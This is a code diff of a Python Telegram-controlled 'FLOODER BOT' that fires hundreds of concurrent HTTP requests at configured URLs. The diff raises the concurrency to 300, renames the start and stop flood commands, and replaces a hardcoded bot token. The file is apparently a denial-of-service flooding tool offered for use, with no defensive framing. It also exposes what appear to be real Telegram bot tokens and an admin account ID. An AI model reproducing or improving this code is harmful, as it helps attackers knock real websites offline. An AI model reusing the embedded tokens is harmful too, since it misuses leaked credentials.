@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-🔥 SIMPLE FLOODER BOT – Sirf Commands, 100% Working
+🔥 FLOODER BOT – 100% Working
 """
 import asyncio
 import aiohttp
@@ -18,7 +18,7 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # ─── TELEGRAM CONFIG ──────────────────────────────────────
-BOT_TOKEN = "8711419221:AAFFvDwGXDIw0qTbAiY8zJSmqS77b06I_9o"
+BOT_TOKEN = "8711419221:AAGx9Rylji34qJeOShWZk0gQkv9YPZ7fXDo"
 ADMIN_ID = 8401097557
 
 # ─── URLS ──────────────────────────────────────────────
@@ -38,7 +38,7 @@ successful_requests = 0
 failed_requests = 0
 running = False
 flooder_task = None
-CONCURRENT_LIMIT = 200
+CONCURRENT_LIMIT = 300
 
 # ─── FETCH FUNCTION ────────────────────────────────────
 async def fetch_one(session, url, semaphore, index):
@@ -95,8 +95,8 @@ async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🔥 **FLOODER BOT**\n"
         "/status – Live stats\n"
-        "/start – Start flood\n"
-        "/stop – Stop flood\n"
+        "/startflood – Start flood\n"
+        "/stopflood – Stop flood\n"
         "/speed <num> – Set concurrent"
     )
 
@@ -174,11 +174,14 @@ async def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start_cmd))
     app.add_handler(CommandHandler("status", status_cmd))
-    app.add_handler(CommandHandler("start", start_flooder))
-    app.add_handler(CommandHandler("stop", stop_flooder))
+    app.add_handler(CommandHandler("startflood", start_flooder))
+    app.add_handler(CommandHandler("stopflood", stop_flooder))
     app.add_handler(CommandHandler("speed", set_speed))
     
-    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 Bot Online")
+    try:
+        await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 Bot Online")
+    except:
+        pass
     
     await app.initialize()
     await app.start()
